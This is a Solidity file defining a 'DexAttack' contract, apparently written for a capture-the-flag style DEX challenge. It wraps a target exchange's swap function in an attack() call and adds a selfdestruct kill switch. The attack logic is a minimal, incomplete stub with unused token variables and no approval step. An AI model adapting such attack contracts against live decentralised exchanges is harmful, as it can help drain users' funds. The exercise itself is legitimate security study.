// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Dex {
    function approve(address spender, uint256 amount) external;

    function swap(
        address from,
        address to,
        uint256 amount
    ) external;
}

contract DexAttack {
    Dex dex_victim;

    address payable owner;
    uint256 approveamount = 10;
    address token1;
    address token2;

    constructor(address _victim) public {
        dex_victim = Dex(_victim);
        owner = msg.sender;
    }

    function attack(address from, address to) public {
        dex_victim.swap(from, to, approveamount);
    }

    function kill() public {
        selfdestruct(owner);
    }
}